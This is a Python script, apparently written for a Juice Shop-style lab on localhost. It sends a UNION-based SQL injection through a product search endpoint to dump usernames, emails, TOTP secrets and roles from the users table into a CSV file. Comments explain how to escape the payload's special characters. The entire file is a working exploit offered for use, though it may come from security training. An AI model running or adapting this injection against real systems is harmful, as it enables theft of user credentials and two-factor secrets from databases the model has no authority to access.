#!/usr/bin/env python3
import os
import json
import argparse
import requests
import pandas as pd

# Pandas Config
pd.set_option('display.max_columns', None)

# Make sure to escape special chars eg. payload=abc'))--
#	then use the following: payload=abc\'\)')--

# UPDATE: when parseing -u "" must be encapsulated with "" then
# no need to \ escape special char


url = "http://localhost:3000//rest/products/search?q=a'))union%20select%20username,email,totpSecret,role,id,6,7,8,9%20from%20users--" 
output = 'output.csv'
csv_columns = ['1', '2', '3', '4', '5', '6', '7', '8', '9']


r = requests.get(url) # r.json() gives the json extracted in response body

r_json = r.json()

target_key = 'data'

jsonList = r_json[target_key] # list of json docs


# Create an array of dict in { new_col : old_col }
col_lib = []
for i in range(len(csv_columns)):
	old_col = list(jsonList[0].items())[i][0]
	new_col = csv_columns[i]
	col_lib.append({new_col:old_col})

# Convert jsonList.json to pandas dataframe:
#dataframe = pd.DataFrame.from_dict(jsonList, orient="index")
df = pd.json_normalize(jsonList)

df.columns = csv_columns

print(df)

df.to_csv('output.csv',index=False)